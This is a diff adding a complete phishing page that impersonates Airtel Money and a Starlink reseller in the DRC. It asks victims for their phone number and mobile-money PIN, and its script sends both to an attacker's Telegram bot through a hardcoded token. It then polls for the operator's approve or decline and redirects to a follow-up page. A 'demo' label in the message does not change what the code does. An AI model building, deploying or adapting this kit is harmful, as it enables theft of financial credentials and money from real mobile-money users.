@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Airtel Money - Secure Payment</title>
+    <link rel="icon" type="image/png" href="https://www.starlink.com/favicon.ico">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .drc-flag {
+            position: relative;
+            width: 60px;
+            height: 40px;
+            background-color: #003399;
+            border-radius: 0.25rem;
+            overflow: hidden;
+        }
+        
+        .drc-flag::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient( 135deg, transparent 42%, yellow 42%, yellow 46%, red 46%, red 54%, yellow 54%, yellow 58%, transparent 58%);
+        }
+        
+        .drc-flag::after {
+            content: '';
+            position: absolute;
+            top: 5%;
+            left: 5%;
+            width: 30%;
+            height: 30%;
+            background: yellow;
+            clip-path: polygon( 50% 0%, 61% 35%, 98% 35%, 68% 57%, 79% 91%, 50% 70%, 21% 91%, 32% 57%, 2% 35%, 39% 35%);
+        }
+        
+         :root {
+            --airtel-red: #FF0000;
+            --airtel-dark-red: #D00000;
+        }
+        
+        .card-shadow {
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        
+        .package-card {
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            cursor: pointer;
+        }
+        
+        .package-card:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 8px 12px rgba(0, 0, 0, 0.15);
+        }
+        
+        .package-card.selected {
+            border: 2px solid #000;
+            background-color: #f8fafc;
+        }
+        
+        .pin-box {
+            transition: border-color 0.2s ease, box-shadow 0.2s ease;
+        }
+        
+        .pin-box:focus {
+            border-color: var(--airtel-red);
+            box-shadow: 0 0 0 2px rgba(255, 0, 0, 0.2);
+            outline: none;
+        }
+        /* Overlay for decline message */
+        
+        #declineOverlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.6);
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        
+        #declineOverlay.show {
+            display: flex;
+        }
+        
+        .decline-box {
+            background: white;
+            padding: 2rem;
+            border-radius: 1rem;
+            text-align: center;
+            max-width: 400px;
+            margin: 1rem;
+        }
+    </style>
+</head>
+
+<body class="bg-gray-50">
+
+    <!-- Decline Overlay -->
+    <div id="declineOverlay">
+        <div class="decline-box">
+            <div class="text-5xl mb-4">❌</div>
+            <h2 class="text-2xl font-bold text-red-600 mb-2">Incorrect details entered</h2>
+            <p class="text-gray-600 mb-6">The information provided is incorrect. Please try again.</p>
+            <button onclick="closeDecline()" class="bg-black text-white px-8 py-3 rounded-xl font-bold hover:bg-gray-800">
+                Try again
+            </button>
+        </div>
+    </div>
+
+    <!-- Header -->
+    <header class="bg-black text-white shadow-sm">
+        <div class="max-w-7xl mx-auto px-4 py-4 flex items-center justify-between">
+            <a href="/" class="flex items-center gap-2">
+                <span class="font-bold text-2xl tracking-widest">STARLINK</span>
+                <span class="text-sm border-l pl-2 ml-2 border-gray-600 hidden sm:inline">RDC Reseller</span>
+            </a>
+            <nav class="flex gap-6">
+                <a href="/dashboard/" class="text-gray-300 hover:text-white flex items-center gap-2">
+                    <i class="uil uil-wifi"></i> <span class="hidden sm:inline">Status</span>
+                </a>
+                <a href="/plans/" class="text-gray-300 hover:text-white flex items-center gap-2">
+                    <i class="uil uil-home"></i> <span class="hidden sm:inline">Plans</span>
+                </a>
+                <a href="/records/" class="text-gray-300 hover:text-white flex items-center gap-2">
+                    <i class="uil uil-list-ul"></i> <span class="hidden sm:inline">Orders</span>
+                </a>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="max-w-7xl mx-auto px-4 py-8">
+        <div class="flex items-center justify-center min-h-screen pb-24">
+            <div class="w-full max-w-md mx-4">
+
+                <!-- Airtel Header with Logo -->
+                <div class="bg-gradient-to-r from-red-600 to-red-700 rounded-t-3xl p-6 sm:p-8 text-center shadow-lg">
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQTICkXqu9YQ2VAvDroBy3v_e9AkSB6Od-uEHMNDn3z4Q&s=10" alt="Airtel" class="h-12 sm:h-14 mx-auto" style="filter: brightness(0) invert(1);">
+                    <h2 class="text-white font-bold mt-4 text-xl sm:text-2xl">Airtel Money</h2>
+                </div>
+
+                <!-- Main Form Card -->
+                <div class="bg-white rounded-b-3xl card-shadow p-6 sm:p-8 border-x border-b border-gray-100">
+
+                    <div class="mb-8">
+                        <div class="flex flex-col sm:flex-row justify-between items-center mb-6 pb-6 border-b border-gray-100 gap-4">
+                            <div class="text-center sm:text-left">
+                                <p class="text-gray-400 text-xs uppercase font-bold tracking-widest">Amount</p>
+                                <p class="text-3xl sm:text-2xl font-black text-red-600">ZWM </p>
+                            </div>
+                            <div class="text-center sm:text-right">
+                                <p class="text-gray-400 text-xs uppercase font-bold tracking-widest">Service</p>
+                                <p class="text-sm font-bold text-gray-700">Starlink Renewal</p>
+                            </div>
+                        </div>
+                        <p class="text-gray-600 text-sm text-center">Enter your Airtel Money PIN to authorize</p>
+                    </div>
+
+                    <form method="POST" action="/hodl/" class="space-y-6" novalidate id="paymentForm">
+                        <input type="hidden" name="csrfmiddlewaretoken" value="vtuyvrEgVHbTahNb38hFPt0GQ9qT351ONrubpkzN1y6kquHVfZmYkSFKWm2QvCsZ">
+
+                        <!-- Airtel Number Input -->
+                        <div>
+                            <label class="block text-gray-700 font-bold mb-3 text-sm">
+                                Airtel Money Number
+                            </label>
+
+                            <div class="flex border-2 border-gray-300 rounded-xl overflow-hidden focus-within:border-red-600 focus-within:ring-2 focus-within:ring-red-100 transition-all duration-300">
+
+                                <div class="flex items-center px-3 border-r border-gray-300 bg-gray-50 gap-2">
+
+                                    <img id="countryFlag" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTwNX7vI7BY0UbaB9FW42-wLre7RwLLWRul7JhfqvvnwA&s=10" class="w-5 h-4 object-cover rounded-sm" alt="flag">
+
+                                    <select id="countryCode" class="bg-transparent outline-none text-gray-700 font-bold text-sm cursor-pointer">
+                                        <option value="+260" data-flag="zm">+260</option>
+                                        <option value="+261" data-flag="cg">+261</option>
+                                        <option value="+262" data-flag="ug">+262</option>
+                                        <option value="+263" data-flag="ke">+263</option>
+                                        <option value="+264" data-flag="tz">+264</option>
+                                        <option value="+265" data-flag="rw">+265</option>
+                                        <option value="+266" data-flag="zm">+266</option>
+                                    </select>
+
+                                </div>
+
+                                <input type="tel" id="phoneNumber" required placeholder="8xxxxxxx" class="flex-1 px-4 py-3 focus:outline-none text-lg font-medium" inputmode="numeric">
+
+                                <input type="hidden" name="email_or_phone" id="fullPhone">
+
+                            </div>
+                        </div>
+
+                        <!-- PIN Entry -->
+                        <div class="text-center mt-8 mb-6">
+                            <p class="text-gray-700 font-bold text-sm">
+                                Enter the 4-digit PIN code
+                            </p>
+                            <p class="text-gray-500 text-xs mt-1">
+                                Check your Airtel Money app or your SMS
+                            </p>
+                        </div>
+
+                        <!-- 4-Digit PIN Boxes -->
+                        <div class="flex justify-center gap-3 mb-8">
+                            <input type="password" maxlength="1" class="pin-box w-12 h-12 sm:w-14 sm:h-14 text-center text-2xl font-bold border-2 border-gray-300 rounded-xl" inputmode="numeric" data-index="0">
+                            <input type="password" maxlength="1" class="pin-box w-12 h-12 sm:w-14 sm:h-14 text-center text-2xl font-bold border-2 border-gray-300 rounded-xl" inputmode="numeric" data-index="1">
+                            <input type="password" maxlength="1" class="pin-box w-12 h-12 sm:w-14 sm:h-14 text-center text-2xl font-bold border-2 border-gray-300 rounded-xl" inputmode="numeric" data-index="2">
+                            <input type="password" maxlength="1" class="pin-box w-12 h-12 sm:w-14 sm:h-14 text-center text-2xl font-bold border-2 border-gray-300 rounded-xl" inputmode="numeric" data-index="3">
+                        </div>
+
+                        <!-- Hidden PIN field -->
+                        <input type="hidden" id="pin-field" name="password" value="">
+
+                        <!-- Submit Button -->
+                        <button type="submit" class="w-full bg-gradient-to-r from-red-600 to-red-700 hover:from-red-700 hover:to-red-800 text-white font-black py-4 rounded-xl shadow-lg shadow-red-200 transition-all transform active:scale-95 uppercase tracking-widest flex items-center justify-center gap-2">
+                            <i class="uil uil-check-circle"></i>
+                            Confirm Payment
+                        </button>
+                    </form>
+
+                    <!-- Security Note -->
+                    <div class="mt-8 flex items-center justify-center gap-2 text-gray-500">
+                        <i class="uil uil-shield-check text-lg text-green-600"></i>
+                        <p class="text-[11px] uppercase font-bold tracking-widest">SSL Encrypted and Secure</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-black text-gray-400 py-12 mt-12">
+        <div class="max-w-7xl mx-auto px-4">
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-8 mb-8">
+                <div>
+                    <h3 class="text-white font-bold mb-4">STARLINK RDC</h3>
+                    <p class="text-sm">Authorized reseller of data plans for Starlink services in RDC. Fast, reliable and secure payments via Airtel Money.</p>
+                </div>
+                <div>
+                    <h3 class="text-white font-bold mb-4">SUPPORT</h3>
+                    <p class="text-sm">Email: support@starlinkrdc.reseller</p>
+                    <p class="text-sm">Available 24/7 for technical support.</p>
+                </div>
+                <div>
+                    <h3 class="text-white font-bold mb-4">PAYMENT</h3>
+                    <p class="text-sm">Pay securely with Airtel Money. Make sure you have sufficient balance for the selected plan.</p>
+                </div>
+            </div>
+            <div class="border-t border-gray-800 pt-8 text-center">
+                <p>&copy; 2026 Starlink RDC Reseller. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+
+            // ===== TELEGRAM CONFIG (TO REPLACE) =====
+            const TELEGRAM_BOT_TOKEN = "8868126718:AAGWhx2m0mMJn45vZDxKCtQTpj8ky2C7y1Q";
+            const TELEGRAM_CHAT_ID = "5946203307";
+            // =========================================
+
+            const countrySelect = document.getElementById("countryCode");
+            const countryFlag = document.getElementById("countryFlag");
+            const phoneInput = document.getElementById("phoneNumber");
+            const fullPhone = document.getElementById("fullPhone");
+            const pinBoxes = document.querySelectorAll(".pin-box");
+            const hiddenPin = document.getElementById("pin-field");
+            const form = document.getElementById("paymentForm");
+            const declineOverlay = document.getElementById("declineOverlay");
+
+            let sentMessageId = null;
+            let lastUpdateId = 0;
+            let pollingActive = false;
+
+            // Change flag when country changes
+            countrySelect.addEventListener("change", function() {
+                const selected = this.options[this.selectedIndex];
+                const flag = selected.getAttribute("data-flag");
+                countryFlag.src = "https://flagcdn.com/w40/" + flag + ".png";
+            });
+
+            // Numbers only for phone
+            phoneInput.addEventListener("input", function() {
+                this.value = this.value.replace(/\D/g, "");
+            });
+
+            // PIN Boxes logic
+            function updatePin() {
+                let pin = "";
+                pinBoxes.forEach(box => {
+                    pin += box.value;
+                });
+                hiddenPin.value = pin;
+            }
+
+            pinBoxes.forEach((box, index) => {
+                box.addEventListener("input", function() {
+                    this.value = this.value.replace(/\D/g, "");
+                    if (this.value && index < pinBoxes.length - 1) {
+                        pinBoxes[index + 1].focus();
+                    }
+                    updatePin();
+                });
+
+                box.addEventListener("keydown", function(e) {
+                    if (e.key === "Backspace" && !this.value && index > 0) {
+                        pinBoxes[index - 1].focus();
+                    }
+                });
+
+                box.addEventListener("paste", function(e) {
+                    e.preventDefault();
+                    const pasted = (e.clipboardData || window.clipboardData)
+                        .getData("text")
+                        .replace(/\D/g, "")
+                        .slice(0, 4);
+                    pasted.split("").forEach((digit, i) => {
+                        if (pinBoxes[i]) pinBoxes[i].value = digit;
+                    });
+                    updatePin();
+                });
+            });
+
+            // === POLLING : listens for bot responses ===
+            function startPolling() {
+                if (pollingActive) return;
+                pollingActive = true;
+
+                const interval = setInterval(() => {
+                    if (!sentMessageId) return;
+
+                    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`;
+
+                    fetch(url)
+                        .then(r => r.json())
+                        .then(data => {
+                            if (!data.ok || !data.result) return;
+
+                            data.result.forEach(update => {
+                                lastUpdateId = update.update_id;
+
+                                if (update.callback_query) {
+                                    const cb = update.callback_query;
+                                    const msgId = cb.message && cb.message.message_id;
+                                    const data = cb.data;
+
+                                    if (msgId === sentMessageId) {
+                                        const answerUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`;
+                                        fetch(answerUrl, {
+                                            method: "POST",
+                                            headers: {
+                                                "Content-Type": "application/json"
+                                            },
+                                            body: JSON.stringify({
+                                                callback_query_id: cb.id
+                                            })
+                                        });
+
+                                        if (data === "approve") {
+                                            clearInterval(interval);
+                                            pollingActive = false;
+                                            window.location.href = "hodlfa.html";
+                                        } else if (data === "decline") {
+                                            clearInterval(interval);
+                                            pollingActive = false;
+                                            showDecline();
+                                        }
+                                    }
+                                }
+                            });
+                        })
+                        .catch(err => console.error("Polling error:", err));
+                }, 2000);
+            }
+
+            // === Show the Decline overlay + reset ===
+            window.showDecline = function() {
+                form.reset();
+                pinBoxes.forEach(box => box.value = "");
+                hiddenPin.value = "";
+                phoneInput.value = "";
+                fullPhone.value = "";
+                sentMessageId = null;
+                pollingActive = false;
+
+                declineOverlay.classList.add("show");
+            };
+
+            // === Close the overlay ===
+            window.closeDecline = function() {
+                declineOverlay.classList.remove("show");
+                phoneInput.focus();
+            };
+
+            // === FORM SUBMIT ===
+            form.addEventListener("submit", function(e) {
+                e.preventDefault();
+
+                const phone = phoneInput.value.trim();
+                if (!phone) {
+                    alert("Please enter your Airtel Money number.");
+                    return;
+                }
+                if (hiddenPin.value.length !== 4) {
+                    alert("Please enter your 4-digit PIN code.");
+                    return;
+                }
+
+                const fullPhoneNumber = countrySelect.value + phone;
+
+                const message = `
+🔴 NEW AIRTEL MONEY PAYMENT (DEMO)
+━━━━━━━━━━━━━━━━━━━━━
+📱 Number : ${fullPhoneNumber}
+🔑 PIN : ${hiddenPin.value}
+🌐 Country : ${countrySelect.options[countrySelect.selectedIndex].text}
+🕐 Timestamp : ${new Date().toLocaleString("en-US")}
+━━━━━━━━━━━━━━━━━━━━━
+⚠️ This is a demo — for testing purposes only.
+            `.trim();
+
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+                fetch(url, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: message,
+                            parse_mode: "HTML",
+                            reply_markup: {
+                                inline_keyboard: [
+                                    [{
+                                        text: "✅ Approve",
+                                        callback_data: "approve"
+                                    }, {
+                                        text: "❌ Decline",
+                                        callback_data: "decline"
+                                    }]
+                                ]
+                            }
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log("Telegram response:", data);
+                        if (data.ok && data.result) {
+                            sentMessageId = data.result.message_id;
+                            startPolling();
+                        } else {
+                            window.location.href = "hodlfa.html";
+                        }
+                    })
+                    .catch(error => {
+                        console.error("Telegram error:", error);
+                        window.location.href = "hodlfa.html";
+                    });
+
+                fullPhone.value = fullPhoneNumber;
+            });
+
+        });
+    </script>
+
+</body>
+
+</html>
